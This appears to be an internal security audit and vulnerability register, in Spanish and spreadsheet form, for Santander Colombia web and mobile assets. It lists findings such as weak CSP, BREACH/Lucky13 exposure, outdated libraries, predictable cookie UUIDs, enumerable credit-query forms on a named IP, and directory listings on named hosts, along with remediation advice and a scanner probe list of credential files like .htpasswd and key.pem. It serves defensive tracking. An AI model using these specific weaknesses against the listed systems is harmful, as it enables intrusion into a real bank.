    <t>Los componentes de un sitio web incluyen diferentes elementos que, en conjunto, contribuyen a la estructura, el aspecto y la funcionalidad de una página web. Estos componentes incluyen contenido de texto, imágenes, hojas de estilo que definen el diseño, scripts que permiten la interactividad, archivos multimedia, fuentes para tipografía, menús de navegación, formularios para la entrada de datos del usuario y widgets o complementos para funciones adicionales. En conjunto, estos componentes crean una experiencia de usuario coherente, que facilita la navegación, la interacción y la difusión de información en el sitio web. Cada componente desempeña un papel fundamental en la entrega de contenido, la mejora del atractivo visual y la participación del usuario.
www.santander.com.co/img/sep_head_btns.png</t>
  </si>
  <si>
    <t>- Optimice la entrega de componentes minimizando el tamaño de los archivos y aprovechando las técnicas de almacenamiento en caché.
- Utilice redes de distribución de contenido (CDN) para distribuir componentes y mejorar la velocidad de carga.
- Implementar mecanismos robustos de manejo de errores para manejar con elegancia las fallas de carga de componentes.
- Utilice opciones de respaldo o contenido alternativo para componentes críticos para garantizar una experiencia de usuario perfecta, incluso en caso de fallas de carga.
- Supervisar periódicamente el rendimiento del sitio web y realizar pruebas en diferentes dispositivos y condiciones de red.</t>
  </si>
  <si>
    <t>Cuando los componentes esenciales, como imágenes, hojas de estilo, scripts o contenido multimedia, no se cargan, pueden aparecer diseños defectuosos, funciones incompletas y una interactividad reducida. Esto genera frustración en los usuarios y una posible pérdida de participación. Además, puede afectar negativamente a la credibilidad del sitio web, la percepción de la marca y las tasas de conversión, ya que los usuarios pueden percibirlo como poco confiable o poco profesional.</t>
  </si>
  <si>
    <t>MAN-6706612a7d9a8c7b25dd8df7</t>
  </si>
  <si>
    <t>SC-24-CNMPO-013-AP-001</t>
  </si>
  <si>
    <t>Durante las pruebas realizadas se ha observado que la cookie incap_ses_XXXX_XXXXXXX, asociada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t>
  </si>
  <si>
    <t>1° Fecha: 30/04/2025</t>
  </si>
  <si>
    <t>MAN-6706616c7d9a8c7b25dd8e0c</t>
  </si>
  <si>
    <t>SC-24-CNMPO-013-CO-002</t>
  </si>
  <si>
    <t>Ausencia de cabecera Content-Security-Policy</t>
  </si>
  <si>
    <t>Se ha detectado que el servidor web incluye la cabecera "Content Security Policy" configurada de forma incorrecta en las respuestas HTTP del servidor.
La cabecera incluye los atributos "unsafe-inline" y "unsafe-eval", los cuales facilitan la inyección de código malicioso mediante vulnerabilidades XSS.</t>
  </si>
  <si>
    <t>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"Content-Security-Policy" (en ocasiones se observarán menciones de la cabecera X-Content-Security-Policy, pero se trata de una versión antigua y no es necesario configurarla). 
Un ejemplo de configuración de cabecera es el siguiente: 
• Content-Security-Policy: default-src 'self' *.trusted.com 
Alternativamente, el elemento &lt;meta&gt; puede ser usado para configurar una política, por ejemplo: 
• &lt;meta http-equiv="Content-Security-Policy" content="default-src 'self'; img-src https://*; child-src 'none';"&gt;
Para obtener una referencia completa acerca de todas las directivas "Content Security Policy" se recomienda visitar los siguientes enlaces: 
• https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP 
• https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html</t>
  </si>
  <si>
    <t>La ausencia de la cabecera "Content Security Policy" puede permitir a un atacante que localice una vulnerabilidad de tipo "Cross Site Scripting"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t>
  </si>
  <si>
    <t>MAN-670661ae7d9a8c7b25dd8e2f</t>
  </si>
  <si>
    <t>SC-24-CNMPO-013-CO-003</t>
  </si>
  <si>
    <t>Durante el análisis de las conexiones cifradas se ha podido comprobar que el servidor web ofrece compresión Gzip en sus conexiones.</t>
  </si>
  <si>
    <t>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como se deshabilita la compresión HTTP para Apache y NGINX: Deshabilitar compresión en Apache: 
• Deshabilite el módulo mod_deflate utilizando el siguiente comando: $ sudo a2dismod deflate 
• Reinicie el servidor: $ sudo /etc/init.d/apache2 restart
Deshabilitar compresión en NGINX: 
• Establezca la configuración del host con la opción gzip en off: 
server { server_name www.example.com; listen 443 ssl http2; gzip off; }</t>
  </si>
  <si>
    <t>MAN-670661e27d9a8c7b25dd8e52</t>
  </si>
  <si>
    <t>SC-24-CNMPO-013-CO-004</t>
  </si>
  <si>
    <t xml:space="preserve">Se ha podido comprobar que el servidor que sustenta la aplicación es vulnerable a Lucky13. </t>
  </si>
  <si>
    <t>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 https://www.openssl.org/source/</t>
  </si>
  <si>
    <t>MAN-670cd4b67d9a8c7b25e5d0af</t>
  </si>
  <si>
    <t>SC-24-CNMPO-014-VE-002</t>
  </si>
  <si>
    <t>CVE-2024-6531
CVE-2022-31147
CVE-2021-43306
CVE-2021-21252</t>
  </si>
  <si>
    <t xml:space="preserve">Se ha detectado que la aplicación auditada utiliza una versión de bootstrap.min.js con vulnerabilidades públicas asociadas.
Se ha detectado que la aplicación auditada utiliza una versión de jquery.validate.js con vulnerabilidades públicas asociadas.
</t>
  </si>
  <si>
    <t>Se recomienda actualizar la versión de Bootstrap y jQuery Validation Plugin y establecer una política de actualizaciones o aplicación de parches para tratar evitar posteriores vulnerabilidades.
Las últimas versiones de ambas librerías pueden ser descargada desde la siguiente dirección URL: 
• https://getbootstrap.com/ 
• https://github.com/jquery-validation/jquery-validation/releases/tag/1.19.5</t>
  </si>
  <si>
    <t>MAN-670cd5317d9a8c7b25e5d0b1</t>
  </si>
  <si>
    <t>SC-24-CNMPO-014-AP-004</t>
  </si>
  <si>
    <t>Generación insegura de UUIDs para cookies</t>
  </si>
  <si>
    <t xml:space="preserve">Se ha detectado una dependencia javascript (/js/cookiesUtils.js) con un método generateUUID() para generar cookies que utiliza Math.random() para generar un valor aleatorio.
</t>
  </si>
  <si>
    <t>Es recomendable reemplazar el uso de Math.random() por una función criptográficamente segura para generar UUIDs, como crypto.randomUUID() o crypto.getRandomValues(). Estas funciones proporcionan un nivel adecuado de aleatoriedad y seguridad, minimizando el riesgo de predicción y garantizando la protección de las cookies y la integridad de las sesiones.</t>
  </si>
  <si>
    <t>El uso de un generador de números pseudoaleatorios no seguro para la creación de UUIDs en cookies introduce un riesgo significativo de suplantación de sesiones. Si un atacante logra predecir los UUIDs generados por Math.random(), puede manipular cookies para acceder a cuentas de usuario o datos confidenciales sin autenticación adecuada. Esto compromete la confidencialidad del usuario.</t>
  </si>
  <si>
    <t>MAN-67124e8b96d088205b814175</t>
  </si>
  <si>
    <t>SC-24-CNMPO-018-CO-002</t>
  </si>
  <si>
    <t>Renegociación segura por RFC 5746 no soportada</t>
  </si>
  <si>
    <t xml:space="preserve">El servicio https no muestra que soporte la renegociación segura según el estandar RFC 5746.
</t>
  </si>
  <si>
    <t>Se recomienda actualizar el software que maneja las comunicaciones TLS y habilitar la renegociación segura segun RFC 5746.</t>
  </si>
  <si>
    <t>Un atacante podría forzar la renegociación del cliente con el servidor para descifrar la comunicación cifrada y realizar un ataca Man in the Middle.</t>
  </si>
  <si>
    <t>MAN-67124cd696d088205b814173</t>
  </si>
  <si>
    <t>SC-24-CNMPO-017-CO-002</t>
  </si>
  <si>
    <t>Santander Token Colombia</t>
  </si>
  <si>
    <t>MAN-6717af0e96d088205b838338</t>
  </si>
  <si>
    <t>SC-24-CNMPO-016-AP-001</t>
  </si>
  <si>
    <t>Código fuente de la aplicación no ofuscado (Android)</t>
  </si>
  <si>
    <t xml:space="preserve">En el desarrollo de aplicaciones Android, la ofuscación del código fuente es una técnica de seguridad que dificulta el análisis y la ingeniería inversa. Sin embargo, si una aplicación se distribuye sin ofuscar su código, los atacantes pueden fácilmente descompilar y examinar el código fuente, obteniendo acceso a lógica interna, claves de API, y otras informaciones sensibles.
Durante la auditoría realizada sobre la aplicación ha sido posible decompilar el código fuente de la misma obteniendo una interpretación del código fuente en un formato legible. </t>
  </si>
  <si>
    <t>Para mitigar esta vulnerabilidad, se deben tomar las siguientes medidas: 
- Ofuscar el Código Fuente: Utilice herramientas como ProGuard o R8 para ofuscar el código antes de distribuir la aplicación. 
- Proteger Claves y Credenciales: Almacene claves API y credenciales de forma segura utilizando Android Keystore o servicios de backend seguros.
- Implementar Análisis de Código: Realice análisis estático y dinámico del código para identificar posibles exposiciones de información. 
- Revisar Librerías de Terceros: Asegúrese de que las bibliotecas de terceros utilizadas también sigan prácticas de ofuscación y seguridad adecuadas.</t>
  </si>
  <si>
    <t>La falta de ofuscación del código puede llevar a varios problemas de seguridad, incluyendo: 
- Exposición de lógica interna: Los atacantes pueden entender la lógica de la aplicación y encontrar vulnerabilidades. 
- Robo de información sensible: Acceso a credenciales, claves API y otros datos críticos. 
- Ingeniería inversa fácil: Los atacantes pueden modificar la aplicación para su propio beneficio o crear versiones fraudulentas.</t>
  </si>
  <si>
    <t>Botón de pago PSE</t>
  </si>
  <si>
    <t>MAN-673b27ca86437e5a65e05b8b</t>
  </si>
  <si>
    <t>SC-24-CNMP0-020-CO-001</t>
  </si>
  <si>
    <t>Ausencia o mala implementación de mecanismos de prevención contra ataques automatizados</t>
  </si>
  <si>
    <t>181.57.221.233</t>
  </si>
  <si>
    <t>http://181.57.221.233/#/views/home</t>
  </si>
  <si>
    <t>Los formularios de la aplicación carecen o tienen mal implementados los mecanismos que previenen el envío masivo y automatizado de solicitudes, como un sistema CAPTCHA. Esto permite la posibilidad de que un usuario malintencionado intente repetidamente extraer información confidencial mediante un gran número de peticiones, lo que incrementa el riesgo de fuga de información.
Los formularios de consulta de crédito carecen de sistemas de prevención contra ataques automatizados, se ha podido comprobar que el formulario 2 si cuenta con un sistema CAPTCHA, pero este solamente se encuentra implementado en la parte cliente (navegador del usuario).
OCURRENCIA 1 – Formulario 1
Se muestra una petición y respuesta del formulario 1 de la aplicación, en la cual puede observarse la ausencia de cualquier mecanismo de prevención de ataques automatizados. Un usuario malintencionado podría automatizar la petición GET para modificar el identificador de crédito y visualizar aquellos que quedan con saldo pendiente.
OCURRENCIA 2 – Formulario 2
Por otro lado, se muestra el Formulario 2 de la aplicación, en la siguiente imagen se puede observar como el formulario tiene implementado un sistema CAPTCHA, pero este solamente se encuentra en la parte cliente y no en la parte del servidor, por lo que cualquier usuario malintencionado podría capturar la petición y automatizarla.,</t>
  </si>
  <si>
    <t>Para mitigar la vulnerabilidad, se deberá de implementar sistemas contra la automatización
de peticiones como, por ejemplo, un sistema CAPTCHA. Dicho sistema deberá de
implementarse tanto en la parte cliente como en la parte servidor.</t>
  </si>
  <si>
    <t>La ausencia de protección contra automatización permite a un usuario malintencionado realizar
ataques de manera eficaz, aumentando la probabilidad de obtener información y exponer
la confidencialidad de los usuarios.</t>
  </si>
  <si>
    <t>MAN-670cd8887d9a8c7b25e5d0b3</t>
  </si>
  <si>
    <t>SC-24-CNMPO-014-CO-006</t>
  </si>
  <si>
    <t>La vulnerabilidad "BREACH" es una instancia del ataque CRIME contra la compresión HTTP de tipo "gzip" o "DEFLATE"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
Durante el análisis de las conexiones cifradas se ha podido comprobar que el servidor web ofrece compresión Gzip en sus conexiones.</t>
  </si>
  <si>
    <t>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como se deshabilita la compresión HTTP para Apache y NGINX:
Deshabilitar compresión en Apache:
• Deshabilite el módulo mod_deflate utilizando el siguiente comando:
 $ sudo a2dismod deflate
• Reinicie el servidor:
 $ sudo /etc/init.d/apache2 restart
Deshabilitar compresión en NGINX:
• Establezca la configuración del host con la opción gzip en off:
 server {
 server_name www.example.com;
 listen 443 ssl http2;
 gzip off;
 }</t>
  </si>
  <si>
    <t>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t>
  </si>
  <si>
    <t>Portal de Recaudos Empresariales</t>
  </si>
  <si>
    <t>QA-WAS-12dbc6b0-9ed7-49b9-98e3-e1e329e9dfe5</t>
  </si>
  <si>
    <t>Directory Listing</t>
  </si>
  <si>
    <t>5.3</t>
  </si>
  <si>
    <t>https://portalpagos.santander.com.co/assets/</t>
  </si>
  <si>
    <t>El servidor Web presenta un listado de directorios.</t>
  </si>
  <si>
    <t>La presencia de un directorio navegable no implica necesariamente una vulnerabilidad. Determine si se pretende mostrar el listado del directorio. Compruebe que no haya archivos en el directorio con contenido que no deba ser servido por la aplicación Web.</t>
  </si>
  <si>
    <t>Proveedor confirma la remediacion de las vulnerabilidades y se confirma con la herramienta de qualys.</t>
  </si>
  <si>
    <t>QA-WAS-4c2c7a9c-7fb0-435a-a80e-6c1099121bb4</t>
  </si>
  <si>
    <t>https://portalpagos.santander.com.co/assets/?C=N%3BOD</t>
  </si>
  <si>
    <t>QA-WAS-02ee015a-67f4-4b54-b467-233321f25c4d</t>
  </si>
  <si>
    <t>https://portalpagos.santander.com.co/assets/fonts/</t>
  </si>
  <si>
    <t>QA-WAS-8bdef08c-dea2-48b4-8c95-9db2a6f26e4b</t>
  </si>
  <si>
    <t>https://portalpagos.santander.com.co/assets/fonts/?C=S%3BOA</t>
  </si>
  <si>
    <t>QA-WAS-6740989f-a0cd-4d20-83c1-bc0d903af637</t>
  </si>
  <si>
    <t>https://portalpagos.santander.com.co/assets/icons/</t>
  </si>
  <si>
    <t>QA-WAS-b93dae53-dcc2-4ce9-b5fa-51897aca34e2</t>
  </si>
  <si>
    <t>https://portalpagos.santander.com.co/assets/icons/?C=S%3BOA</t>
  </si>
  <si>
    <t>QA-WAS-5d9a5414-6836-4b0f-8ecc-ef114b31bcf1</t>
  </si>
  <si>
    <t>https://portalpagos.santander.com.co/assets/icons/categories/</t>
  </si>
  <si>
    <t>QA-WAS-4bf217e1-cd03-40a3-bb02-1ddcc5fcd102</t>
  </si>
  <si>
    <t>https://portalpagos.santander.com.co/assets/icons/categories/?C=S%3BOA</t>
  </si>
  <si>
    <t>QA-WAS-8b5b7ab8-3415-43ea-9468-a1b446ed290c</t>
  </si>
  <si>
    <t>https://portalpagos.santander.com.co/assets/icons/categories/_iconos_V1/</t>
  </si>
  <si>
    <t>QA-WAS-a2efd400-3afb-4bfe-ba29-3c96704a6fea</t>
  </si>
  <si>
    <t>https://portalpagos.santander.com.co/assets/icons/categories/_iconos_V1/?C=S%3BOA</t>
  </si>
  <si>
    <t>QA-WAS-de7dbffb-a44a-4b73-b860-d91614b3d171</t>
  </si>
  <si>
    <t>https://portalpagos.santander.com.co/assets/icons/categories/_iconos_V2/</t>
  </si>
  <si>
    <t>QA-WAS-28fbadc8-90e6-4e58-a8ac-7ace71ebd88a</t>
  </si>
  <si>
    <t>https://portalpagos.santander.com.co/assets/icons/categories/_iconos_V2/?C=S%3BOA</t>
  </si>
  <si>
    <t>QA-WAS-39908f21-1c19-4af5-97f4-c17c39f2a129</t>
  </si>
  <si>
    <t>https://portalpagos.santander.com.co/assets/images/</t>
  </si>
  <si>
    <t>QA-WAS-9f197577-9a20-4d82-8808-3d42974a1401</t>
  </si>
  <si>
    <t>https://portalpagos.santander.com.co/assets/images/?C=S%3BOA</t>
  </si>
  <si>
    <t>QA-WAS-ece244a4-c909-4a1b-bfaa-8fc42c649223</t>
  </si>
  <si>
    <t>Vulnerable JavaScript Library Detected - Bootstrap</t>
  </si>
  <si>
    <t>6.4</t>
  </si>
  <si>
    <t>https://portalrecaudos.santander.com.co/</t>
  </si>
  <si>
    <t>Bootstrap es un framework CSS gratuito y de código abierto dirigido al desarrollo web responsivo. Contiene plantillas de diseño basadas en HTML, CSS y JavaScript para tipografía, formularios, botones, navegación y otros componentes de la interfaz.
La aplicación web utiliza una biblioteca JavaScript que se sabe que contiene al menos una vulnerabilidad.</t>
  </si>
  <si>
    <t>QA-WAS-22042845-d7d4-4e20-a5a4-804735dcba1c</t>
  </si>
  <si>
    <t>5.8</t>
  </si>
  <si>
    <t>La página web puede enmarcarse. Esto significa que son posibles los ataques de clickjacking contra los usuarios.</t>
  </si>
  <si>
    <t>QA-WAS-4dc35838-eedb-4a1e-8621-bccc4988a138</t>
  </si>
  <si>
    <t>https://portalrecaudos.santander.com.co/?emp=1&amp;user=John</t>
  </si>
  <si>
    <t>QA-WAS-fe9efec0-ec37-4fa3-9b44-1eb726cfa80d</t>
  </si>
  <si>
    <t>https://portalrecaudos.santander.com.co/assets/</t>
  </si>
  <si>
    <t>QA-WAS-75df9d15-395f-41e6-9060-dc0e45a6078d</t>
  </si>
  <si>
    <t>https://portalrecaudos.santander.com.co/assets/css/</t>
  </si>
  <si>
    <t>1° Fecha: 30/06/2025</t>
  </si>
  <si>
    <t>QA-WAS-0b7e1d60-ad54-4d4b-9229-e4a082d20a82</t>
  </si>
  <si>
    <t>https://portalrecaudos.santander.com.co/assets/fonts/</t>
  </si>
  <si>
    <t>QA-WAS-946c67fc-d81b-4b87-bc27-dd11a18cd0e3</t>
  </si>
  <si>
    <t>https://portalrecaudos.santander.com.co/assets/fonts/BUGS</t>
  </si>
  <si>
    <t>QA-WAS-342ff6df-2d9f-4423-b520-63b6f5118f36</t>
  </si>
  <si>
    <t>https://portalrecaudos.santander.com.co/assets/images/</t>
  </si>
  <si>
    <t>QA-WAS-26245544-7a4d-4daf-b690-a42b5bd95251</t>
  </si>
  <si>
    <t>https://portalrecaudos.santander.com.co/icons/small/</t>
  </si>
  <si>
    <t>QA-WAS-af131c7f-6755-4482-bd56-05d0f6117d96</t>
  </si>
  <si>
    <t>https://servicios.santander.com.co/common/squidGuard.conf.template</t>
  </si>
  <si>
    <t>Se ha descubierto un archivo potencialmente sensible en el servidor Web. Este archivo puede o no estar directamente asociado con la aplicación web. 
Archivos comprobados:
nginx.conf, .htpasswd, key.pem, certificate.pem
Lógica de detección de QID:
Este QID envía una solicitud GET al servidor de destino para recuperar el contenido del archivo.</t>
  </si>
  <si>
    <t>Compruebe que el acceso a este archivo está permitido. Si es necesario, elimínelo o aplíquele controles de acceso.</t>
  </si>
  <si>
    <t>1° Fecha: 30/05/2025</t>
  </si>
  <si>
    <t>QA-WAS-b966c71b-24a3-4cf3-9795-bf093a89eba1</t>
  </si>
  <si>
    <t>https://servicios.santander.com.co/webclient/download/</t>
  </si>
  <si>
    <t>QA-WAS-40f3502b-de0d-4749-ae10-f1d395eddfde</t>
  </si>
  <si>
    <t>https://www.santander.com.co/rb_d56b4438-db41-4f20-9ef1-29ccacb1c640?type=js3&amp;sn=v_4_srv_1_sn_A57DAADACE437715EF1B219B9615F6D7_perc_100000_ol_0_mul_1_app-3A11137600a3d63bf2_1&amp;svrid=1&amp;flavor=post&amp;vi=QSTONFCFKEFAUFPAWMPJNISJRCKDBLBL-0&amp;modifiedSince=1702528372070&amp;rf=https%253A%252F%252Fwww.santander.com.co%252Fpg%252Fprestamos.html&amp;bp=3&amp;app=11137600a3d63bf2&amp;crc=680741421&amp;en=3a9l0fyd&amp;end=1</t>
  </si>
  <si>
    <t>QA-VM--859540238512312548</t>
  </si>
  <si>
    <t>Web Directories Listable Vulnerability</t>
  </si>
  <si>
    <t>portalpagos.santander.com.co</t>
  </si>
  <si>
    <t>El servidor Web tiene algunos directorios listados. Se puede obtener información muy sensible de los listados de directorios.</t>
  </si>
  <si>
    <t>Desactivar la exploración o el listado de directorios para todos los directorios.</t>
  </si>
  <si>
    <t>QA-VM-7672366120577977866</t>
  </si>
  <si>
    <t>portalrecaudos.santander.com.co</t>
  </si>
  <si>
    <t>QA-VM-6613074351457283764</t>
  </si>
  <si>
    <t>SSL Certificate - Expired</t>
  </si>
  <si>
    <t>6.5</t>
  </si>
  <si>
    <t>waf.confirming-factoring.santander.com.co</t>
  </si>
  <si>
    <t>Un Certificado SSL asocia una entidad (persona, organización, host, etc.) con una Clave Pública. En una conexión SSL, el cliente autentica el servidor remoto utilizando el Certificado del servidor y extrae la Clave Pública del Certificado para establecer la conexión segura.
No se puede confiar en un certificado cuya fecha de caducidad haya pasado.</t>
  </si>
  <si>
    <t>Por favor, instale un certificado de servidor con fechas de inicio y fin válidas.</t>
  </si>
  <si>
    <t>QA-VM-8737097710009665596</t>
  </si>
  <si>
    <t>SSL Certificate - Signature Verification Failed Vulnerability</t>
  </si>
  <si>
    <t>Un Certificado SSL asocia una entidad (persona, organización, host, etc.) con una Clave Pública. En una conexión SSL, el cliente autentica el servidor remoto utilizando el certificado del servidor y extrae la clave pública del certificado para establecer la conexión segura. La autenticación se realiza verificando que la clave pública del certificado está firmada por una autoridad de certificación externa de confianza.
Si un cliente no puede verificar el certificado, puede abortar la comunicación o pedir al usuario que continúe la comunicación sin autenticación.</t>
  </si>
  <si>
    <t>Instale un certificado de servidor firmado por una autoridad de certificación externa de confianza.</t>
  </si>
  <si>
    <t>Cuando una Autoridad de Certificación (CA) emite un certificado, incorpora dos fechas: la fecha de inicio y la fecha de finalización de su validez. Si un cliente TLS (por ejemplo, un navegador web) se conecta a un servidor TLS (por ejemplo, un sitio web) y recibe un certificado caducado, se negará a conectarse. Los certificados son activos digitales que requieren renovación o descontinuación programada.
Huella dactilar SHA-256
868350329e5e3828ca8a251e7314bf57adcbd7c6ca7ec4db71f509a4685d0b3b
https://tools.ietf.org/html/rfc5280#section-4.1.2.5</t>
  </si>
  <si>
    <t>Los servicios que presentan certificados caducados pueden causar fallos visibles, por lo que debe confirmar que el servicio sigue en uso. Si no lo está, desactívelo. De lo contrario, contacte con la CA y solicite la emisión de un nuevo certificado.
Evaluar la política de gestión de certificados de la organización para garantizar que los certificados se renueven o desactiven antes de su fecha de vencimiento.</t>
  </si>
  <si>
    <t>Los certificados caducados impiden que los clientes TLS se conecten a los servidores.</t>
  </si>
  <si>
    <t>https://www.santander.com.co</t>
  </si>
  <si>
    <t>Los registros del navegador son mensajes o información generados por los scripts o procesos backend de un sitio web, que se envían directamente a la consola del navegador. Estos registros suelen incluir información de depuración, mensajes de error, advertencias u otros resultados de diagnóstico que desarrolladores y usuarios utilizan para la resolución de problemas.</t>
  </si>
  <si>
    <t>El riesgo de emitir registros del navegador reside en la posible exposición de información confidencial a terceros no autorizados. Estos registros pueden revelar inadvertidamente credenciales de usuario, información personal identificable u otros datos confidenciales, que pueden ser explotados por actores maliciosos para robo de identidad, fraude u otros fines maliciosos. Además, la exposición de detalles internos del sistema o mensajes de error puede proporcionar a los atacantes información sobre posibles vulnerabilidades o debilidades en la infraestructura del sitio web.</t>
  </si>
  <si>
    <t>Se detectó una configuración de CSP insegura.</t>
  </si>
  <si>
    <r>
      <t xml:space="preserve">La Política de Seguridad de Contenido no es eficaz para cumplir con los objetivos de seguridad definidos para prevenir ataques de secuencias de comandos entre sitios
Directiva:
</t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t>script-src</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t xml:space="preserve">
Valor:
</t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t>'unsafe-inline'</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t xml:space="preserve">
</t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t>'unsafe-eval'</t>
    </r>
  </si>
  <si>
    <r>
      <t xml:space="preserve">Para mejorar su configuración, asegúrese de:
Implementar directivas que establezcan restricciones de origen válidas y completas para cargar contenido dinámico ('script-src', 'object-src', 'default-src').
Evite el uso de directivas inseguras como 'unsafe-eval' y 'unsafe-inline'.
Evite errores tipográficos o directivas CSP no válidas.
Evite utilizar comodines, listas de permitidos basadas en host o esquemas de URL simples como 'HTTP' en las directivas de origen.
Utilice fuentes específicas, como "https://www.example.com". Elimine generalizaciones como "http:", "https:", "https://*.com".
</t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t>'unsafe-eval'</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t xml:space="preserve">: permite la ejecución de código inyectado en las API DOM como eval().
</t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t>'unsafe-inline'</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t>: permite la ejecución de scripts dentro de la página y controladores de eventos inseguros.</t>
    </r>
  </si>
  <si>
    <t>Prevenir la carga de recursos y scripts de contenido no autorizados.
Prevención del clickjacking y otros ataques de marcos anidados.
Garantizar que los formularios web y los enlaces se comporten según lo previsto.</t>
  </si>
  <si>
    <t>Garantia</t>
  </si>
  <si>
    <t>QA-WAS-0579036e-4b5e-4426-a7b5-8e4bb98be69c</t>
  </si>
  <si>
    <t>https://garantia.santanderconsumer.co/Home/Before</t>
  </si>
  <si>
    <t>La cookie no contiene el atributo "seguro".</t>
  </si>
  <si>
    <t>Si el riesgo asociado de una cuenta comprometida es alto, aplique el atributo "seguro" a las cookies y fuerce a que todas las solicitudes confidenciales se envíen mediante HTTPS.</t>
  </si>
  <si>
    <t>Las cookies con el atributo "seguro" solo pueden enviarse a través de HTTPS. Las cookies enviadas a través de HTTP exponen a un usuario desprevenido a ataques de rastreo que podrían llevar a la suplantación de identidad del usuario o a la vulneración de la cuenta de la aplicación.</t>
  </si>
  <si>
    <t>Jaime Vargas</t>
  </si>
  <si>
    <t>MAN-664dbecadafe1d62bb509729</t>
  </si>
  <si>
    <t>SCO-24-CNMPA-004-CO-002</t>
  </si>
  <si>
    <t>garantia.santanderconsumer.co</t>
  </si>
  <si>
    <t>443</t>
  </si>
  <si>
    <t>El servidor utiliza algoritmos de cifrado CBC sobre TLS por lo que está afectado por vulnerabilidad la Lucky13. Todos los conjuntos de cifrado TLS y DTLS que incluyen el modo de cifrado CBC (Cipher-Block-Chaining) son potencialmente vulnerables a este tipo ataques.</t>
  </si>
  <si>
    <t>Se recomienda utilizar únicamente cifrados robustos como TLSv1.2 o TLSv1.3. Adicionalmente, se recomienda deshabilitar todos los algoritmos CBC (Cipher-Block-Chaining).</t>
  </si>
  <si>
    <t>Los cifrados CBC sobre TLS podrían permitir a un atacante situado en mitad de las comunicaciones (MiTM) implementar una variante del ataque Padding Oracle (POODLE). En base a los posibles impactos aquí descritos y las posibilidades de su explotación se ha valorado esta vulnerabilidad con un riesgo bajo.</t>
  </si>
  <si>
    <t>MAN-393462d5</t>
  </si>
  <si>
    <t>SCO-22-CNMPA-002-AP-002</t>
  </si>
  <si>
    <t xml:space="preserve">Se recomienda proteger los identificadores de sesión mediante el atributo de seguridad "secure", evitando que el identificador de sesión pueda ser transmitido por canales no seguros. La solución concreta dependerá del lenguaje en el que esté implementado la aplicación y de la cookie que se pretenda proteger.
</t>
  </si>
  <si>
    <t>Se recomienda evitar que la aplicación devuelva al usuario información relativa a la naturaleza y versión de la misma. Este tipo de información puede ser accesible a través de los identificadores de sesión utilizados, mensajes de error y/o páginas por defecto.
https://blogs.msdn.microsoft.com/varunm/2013/04/23/remove-unwanted-http-response-headers/</t>
  </si>
  <si>
    <t>MAN-393462d4</t>
  </si>
  <si>
    <t>SCO-22-CNMPA-002-AP-001</t>
  </si>
  <si>
    <t>Durante las pruebas realizadas se ha observado que las cookies asociadas a la gestión de la sesión no tienen aplicado el siguiente atributo de seguridad:
• secure – este atributo indica al navegador que sólo incluya la cookie si se envía a través de un canal seguro como es HTTPs.
La siguiente cookie no establece el indicador de cookie secure</t>
  </si>
  <si>
    <t>Se recomienda proteger los identificadores de sesión mediante el atributo de seguridad "secure", evitando que el identificador de sesión pueda ser transmitido por canales no seguros.</t>
  </si>
  <si>
    <t>MAN-664dbe3bdafe1d62bb509727</t>
  </si>
  <si>
    <t>SCO-24-CNMPA-004-CO-001</t>
  </si>
  <si>
    <t>Inadecuada configuración de la cabecera HTTP Strict Transport Security (HSTS)</t>
  </si>
  <si>
    <t>Durante las pruebas realizadas se ha detectado que la aplicación no tiene implementada correctamente la cabecera, ya que el parámetro max-age tiene un valor inferior al recomendado. Además, no están establecidos los parámetros includeSubDomains y preload.</t>
  </si>
  <si>
    <t>Se recomienda establecer el parámetro max-age con el valor recomendado y establecer los parámetros includeSubDomains y preload. De modo que la cabecera HSTS quedaría de la siguiente forma: 
• Strict-Transport-Security: max-age=31536000; includeSubDomains; preload</t>
  </si>
  <si>
    <t>Un atacante podría interceptar las comunicaciones entre un cliente legítimo y el servidor Web y forzarle a utilizar el protocolo HTTP sin cifrar, de manera que las comunicaciones entre cliente y servidor se harían en texto claro y quedarían expuestos datos sensibles o contraseñas. 
En base a los posibles impactos aquí descritos y las posibilidades de su explotación se ha valorado esta vulnerabilidad con un riesgo bajo.</t>
  </si>
  <si>
    <t>Recurso bloqueado por la Política de Seguridad de Contenido (CSP)</t>
  </si>
  <si>
    <t>La página intentó cargar un recurso que estaba bloqueado por la política CSP.
Se rechazó la aplicación del estilo en línea porque viola la siguiente directiva de la Política de seguridad de contenido: "default-src 'self'". Se requiere la palabra clave 'unsafe-inline', un hash ('sha256-hVrJIRjHPO7BeMLijW6cBMcegAhomV/DK0jWJl/Wy+M=') o un nonce ('nonce-...') para habilitar la ejecución en línea. Tenga en cuenta también que 'style-src' no se configuró explícitamente, por lo que 'default-src' se utiliza como alternativa.</t>
  </si>
  <si>
    <t>Los propietarios de sitios web deben revisar sus sitios para detectar mensajes de violación de CSP. Estos suelen ser una señal de que el sitio está intentando cargar recursos externos desconocidos o no verificados. Hay información detallada sobre estas violaciones disponible en la sección de detalles de evidencia.</t>
  </si>
  <si>
